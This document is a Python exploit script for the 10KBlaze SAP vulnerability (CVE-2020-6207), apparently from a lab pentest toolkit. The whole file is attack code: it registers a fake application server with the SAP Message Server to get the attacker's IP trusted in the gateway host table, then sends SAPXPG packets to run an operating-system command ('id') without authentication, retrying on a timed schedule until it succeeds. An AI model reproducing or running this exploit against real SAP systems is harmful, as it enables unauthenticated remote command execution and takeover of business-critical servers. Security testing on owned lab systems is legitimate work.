#!/usr/bin/env python3
"""
run_10kblaze.py — Clean 10KBlaze (CVE-2020-6207) end-to-end exploit.

Chain:
  1. betrusted: register fake app server with MS, IP injected into GwHostTab
  2. SAPXPG: execute OS command via GW (no auth) once our IP is "local"

MS sends AD_GET_NILIST_PORT at ~t+17min in this environment.
SAPXPG retries cover: 30s, 2min, 5min, 10min, 15min, 18min, 22min, 27min.
"""

import sys, socket, threading, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_ms_betrusted import betrusted
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain,
    hexdump, extract_p4_output,
)

MS_HOST  = '192.168.2.209'
MS_PORT  = 3901
GW_HOST  = '192.168.2.209'
GW_PORT  = 3300
ATT_IP   = '192.168.2.210'
SID      = 'S4H'
INSTANCE = '00'
HOSTNAME = 's4hanadev'
KERNEL   = '793_REL'
DEST     = 'T_75'
CLIENT   = '000'
COMMAND  = 'id'
PARAMS   = ''
TIMEOUT  = 20


def run_sapxpg(label=""):
    tag = f"[t={label}] " if label else ""
    print(f"\n{tag}[XPG] Attempting SAPXPG (cmd='{COMMAND}')...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except socket.error as e:
        print(f"{tag}[XPG] Connect failed: {e}")
        return False

    local_ip = sock.getsockname()[0]

    # P1
    ni_send(sock, build_p1(GW_HOST, INSTANCE))
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print(f"{tag}[XPG] P1 timeout"); sock.close(); return False
    for f in frames:
        if parse_response(f)["error"]:
            print(f"{tag}[XPG] P1 rejected"); sock.close(); return False
    print(f"{tag}[XPG] P1 OK ({len(frames)} frames)")

    # P2 — the trust check
    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None
    gw_id = 0
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        print(hexdump(frames[0][:64]))
        for f in frames:
            info = parse_response(f)
            if info["error"]:
                msg = info.get("error_msg", "")
                print(f"{tag}[XPG] P2 REJECTED: {msg}")
                if "appc_rc=26" in msg:
                    print(f"{tag}[XPG]  → IP not yet in GwHostTab (NILIST not propagated yet)")
                sock.close()
                return False
            if info["conv_id"] and not conv_id:
                conv_id = info["conv_id"]
            if info.get("gw_id") is not None:
                gw_id = info["gw_id"]
    except socket.timeout:
        print(f"{tag}[XPG] P2 timeout"); sock.close(); return False

    print(f"{tag}[XPG] P2 OK: conv_id={conv_id} gw_id={gw_id}")
    if not conv_id:
        conv_id = "0"

    # P3
    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, COMMAND, PARAMS, gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print(f"{tag}[XPG] P3 timeout"); sock.close(); return False

    p3_output = []
    for f in frames:
        info = parse_response(f)
        if info["error"]:
            print(f"{tag}[XPG] P3 error: {info.get('error_msg', '')}"); sock.close(); return False
        p3_output.extend(extract_p4_output(f))

    if p3_output:
        print(f"{tag}[XPG] *** COMMAND OUTPUT (P3) ***")
        for ln in p3_output:
            print(f"    {ln}")
        sock.close()
        return True

    # P4
    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info["error"]:
            print(f"{tag}[XPG] P4 error: {info.get('error_msg', '')}")
        else:
            output = extract_p4_output(resp)
            if output:
                print(f"{tag}[XPG] *** COMMAND OUTPUT (P4) ***")
                for ln in output:
                    print(f"    {ln}")
                sock.close()
                return True
            print(f"{tag}[XPG] P4 OK but no output")
    except socket.timeout:
        print(f"{tag}[XPG] P4 timeout")

    sock.close()
    return False


def main():
    print("=" * 70)
    print(" 10KBlaze (CVE-2020-6207) — betrusted + SAPXPG")
    print(f" MS {MS_HOST}:{MS_PORT}   GW {GW_HOST}:{GW_PORT}   Attacker {ATT_IP}")
    print(" secinfo: default (HOST=local) — exploit only succeeds via GwHostTab")
    print("=" * 70)

    stop_evt = threading.Event()
    bt_result = {}

    def _bt():
        r = betrusted(
            host=MS_HOST, port=MS_PORT, attacker_ip=ATT_IP,
            instance_nr=0, our_name='', target_sid=SID,
            nilist_wait=1500,          # wait 25 min for AD_GET_NILIST_PORT
            dp_version=14, kernel_new=True, verbose=False,
            stop_event=stop_evt,
        )
        bt_result.update(r)

    bt_thread = threading.Thread(target=_bt, daemon=True)
    bt_thread.start()

    t0 = time.time()

    # Retry schedule (absolute seconds from start)
    schedule = [
        (30,   "30s"),
        (120,  "2min"),
        (300,  "5min"),
        (600,  "10min"),
        (900,  "15min"),
        (1080, "18min"),    # shortly after expected AD_GET_NILIST_PORT (~17min)
        (1320, "22min"),
        (1620, "27min"),
    ]

    success = False
    for target_t, label in schedule:
        now = time.time() - t0
        wait = target_t - now
        if wait > 0:
            print(f"\n[*] Waiting {wait:.0f}s until t={label}...")
            time.sleep(wait)

        if not bt_thread.is_alive() and not bt_result.get("success"):
            print("[!] betrusted thread died — aborting")
            break

        nilist_done = bt_result.get("nilist_response", False)
        print(f"\n[*] t={label} (elapsed {time.time()-t0:.0f}s)  "
              f"nilist_replied={nilist_done}")

        success = run_sapxpg(label=label)
        if success:
            print(f"\n{'='*70}")
            print(f" *** 10KBlaze EXPLOIT SUCCEEDED at t={label} ***")
            print(f"{'='*70}")
            break

    stop_evt.set()
    bt_thread.join(timeout=15)

    print(f"\n[*] betrusted result: {bt_result}")
    print(f"[*] Final result: {'SUCCESS' if success else 'FAILED'}")


if __name__ == '__main__':
    main()
